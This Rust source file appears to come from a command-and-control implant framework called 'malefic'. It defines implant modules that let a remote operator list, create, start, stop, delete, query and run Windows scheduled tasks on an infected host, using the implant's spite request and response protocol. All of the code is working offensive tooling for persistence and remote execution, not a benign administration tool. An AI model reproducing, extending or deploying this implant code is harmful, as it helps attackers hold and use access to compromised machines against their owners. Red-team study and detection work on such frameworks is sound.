use std::time::Duration;
use crate::{Module, TaskResult, Result, Input, Output, check_request, check_field};
use malefic_proto::proto::implantpb::{spite::Body};
use async_trait::async_trait;
use malefic_trait::module_impl;
use malefic_helper::win::scheduler::{TaskConfig, TaskSchedulerManager, TaskTriggerType};
use malefic_proto::proto::modulepb::TaskSchedule;

pub fn task_schedule_to_proto(schedule: &malefic_helper::win::scheduler::TaskSchedule) -> TaskSchedule {
    TaskSchedule {
        name: schedule.config.name.clone(),
        path: schedule.config.path.clone(),
        executable_path: schedule.config.executable_path.to_string_lossy().to_string(),
        trigger_type: schedule.config.trigger_type.to_int(),
        start_boundary: schedule.config.start_boundary.clone(),
        description: schedule.config.description.clone(),
        enabled: schedule.status.enabled,
        last_run_time: schedule.status.last_run_time.clone().unwrap_or_default(),
        next_run_time: schedule.status.next_run_time.clone().unwrap_or_default(),
    }
}

pub struct TaskSchdList {}

#[async_trait]
#[module_impl("taskschd_list")]
impl Module for TaskSchdList {
    async fn run(&mut self, id: u32, _receiver: &mut Input, _sender: &mut Output) -> Result {
        let _ = check_request!(_receiver, Body::Request)?;
        let manager = TaskSchedulerManager::initialize()?;

        let tasks = manager.list_tasks("\\")?; // Assuming root folder

        let mut resp = malefic_proto::proto::modulepb::TaskSchedulesResponse::default();
        for task in tasks {
            resp.schedules.push(task_schedule_to_proto(&task));
        }

        Ok(TaskResult::new_with_body(id, Body::SchedulesResponse(resp)))
    }
}

pub struct TaskSchdCreate {}

#[async_trait]
#[module_impl("taskschd_create")]
impl Module for TaskSchdCreate {
    async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> Result {
        let req = check_request!(receiver, Body::ScheduleRequest)?;

        let executable_path = check_field!(req.executable_path)?;
        let path = check_field!(req.path)?;

        let manager = TaskSchedulerManager::initialize()?;
        let config = TaskConfig {
            name: check_field!(req.name)?,
            path,
            description: req.description.clone(),
            executable_path: executable_path.into(),
            trigger_type: TaskTriggerType::from_int(req.trigger_type)?,
            duration: Duration::from_secs(0),
            start_boundary: req.start_boundary.clone(),
            enabled: true,
        };

        manager.create_task(config)?;
        Ok(TaskResult::new(id))
    }
}

pub struct TaskSchdStart {}

#[async_trait]
#[module_impl("taskschd_start")]
impl Module for TaskSchdStart {
    async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> Result {
        let req = check_request!(receiver, Body::ScheduleRequest)?;
        let manager = TaskSchedulerManager::initialize()?;
        let task_name = check_field!(req.name)?;
        let path = check_field!(req.path)?;
        manager.start_task(&path, &task_name)?;

        Ok(TaskResult::new(id))
    }
}

pub struct TaskSchdStop {}

#[async_trait]
#[module_impl("taskschd_stop")]
impl Module for TaskSchdStop {
    async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> Result {
        let req = check_request!(receiver, Body::ScheduleRequest)?;

        let manager = TaskSchedulerManager::initialize()?;
        let task_name = check_field!(req.name)?;
        let path = check_field!(req.path)?;
        manager.stop_task(&path, &task_name)?;

        Ok(TaskResult::new(id))
    }
}

pub struct TaskSchdDelete {}

#[async_trait]
#[module_impl("taskschd_delete")]
impl Module for TaskSchdDelete {
    async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> Result {
        let req = check_request!(receiver, Body::ScheduleRequest)?;

        let manager = TaskSchedulerManager::initialize()?;
        let task_name = check_field!(req.name)?;
        let path = check_field!(req.path)?;
        manager.delete_task(&path, &task_name)?;

        Ok(TaskResult::new(id))
    }
}

pub struct TaskSchdQuery {}

#[async_trait]
#[module_impl("taskschd_query")]
impl Module for TaskSchdQuery {
    async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> Result {
        let req = check_request!(receiver, Body::ScheduleRequest)?;

        let task_name = check_field!(req.name)?;
        let path = check_field!(req.path)?;
        let manager = TaskSchedulerManager::initialize()?;

        let task_schedule = manager.query_task(&path, &task_name)?;

        let resp = task_schedule_to_proto(&task_schedule);

        Ok(TaskResult::new_with_body(id, Body::ScheduleResponse(resp)))
    }
}

pub struct TaskSchdRun {}

#[async_trait]
#[module_impl("taskschd_run")]
impl Module for TaskSchdRun {
    async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> Result {
        let req = check_request!(receiver, Body::ScheduleRequest)?;

        let manager = TaskSchedulerManager::initialize()?;
        let task_name = check_field!(req.name)?;
        let path = check_field!(req.path)?;  
        manager.run_task(&path, &task_name)?;

        Ok(TaskResult::new(id))
    }
}
